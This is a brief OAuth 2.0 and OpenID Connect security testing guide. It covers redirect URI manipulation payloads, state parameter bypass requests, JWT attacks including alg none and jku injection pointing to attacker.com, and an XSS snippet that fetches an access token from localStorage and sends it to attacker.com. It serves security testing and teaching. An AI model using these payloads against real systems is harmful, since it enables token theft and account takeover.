# OAuth 2.0 / OIDC Security Testing Guide

## OAuth Flow Testing

### Authorization Code Flow

```
1. User clicks "Login with OAuth"
2. Redirect to /authorize?client_id=...&redirect_uri=...&response_type=code&scope=...
3. User authenticates with provider
4. Redirect back with authorization code
5. Exchange code for tokens at /token
```

### Testing Points

| Attack Vector | Description |
|--------------|-------------|
| Redirect URI Manipulation | Test for open redirect |
| State Parameter Bypass | CSRF on authorization |
| Scope Escalation | Request more permissions |
| Code Replay | Reuse authorization codes |
| Token Leakage | Find token in referrer |

## Common Vulnerabilities

### 1. Redirect URI Manipulation

```bash
# Try different redirect URIs
redirect_uri=https://attacker.com
redirect_uri=https://target.com.evil.com
redirect_uri=https://target.com//attacker.com
redirect_uri=https://target.com/..attacker.com
```

### 2. State Parameter Bypass

```bash
# Missing state parameter
GET /authorize?client_id=app&response_type=code&redirect_uri=https://app.com/callback

# Empty state
GET /authorize?...&state=

# Predictable state
GET /authorize?...&state=12345
```

### 3. Authorization Code Leakage

```python
# Check for code in referrer header
# Check URL parameters
# Check browser history
```

### 4. Token Replay

```bash
# Reuse authorization code
# Try to use same code twice
```

## OpenID Connect Testing

### ID Token Vulnerabilities

| Attack | Description |
|--------|-------------|
| Algorithm Confusion | Change RS256 to HS256 |
| Key Confusion | Use public key as HMAC secret |
| None Algorithm | alg: none |
| jku Header Injection | Point to attacker key server |

### JWT Attacks

```python
# None algorithm
{"alg": "none"}

# HS256 with known key
{"alg": "HS256", "kid": "..."}

# jku header injection
{"alg": "RS256", "jku": "https://attacker.com/keys.json"}
```

## Token Theft

### Refresh Token Theft

```bash
# Check for token in URL
# Check localStorage
# Check browser extensions
# Check HTTP only cookies
```

### Access Token Theft

```python
# XSS to steal tokens
<script>
fetch('https://attacker.com?c='+localStorage.getItem('access_token'))
</script>
```

## Best Practices

1. Always use state parameter
2. Validate redirect_uri strictly
3. Use PKCE
4. Implement token rotation
5. Use short-lived tokens

## Tools

- OAuth 2.0 Security Cheat Sheet
- oauth:io
- Burp Suite OAuth Analyzer
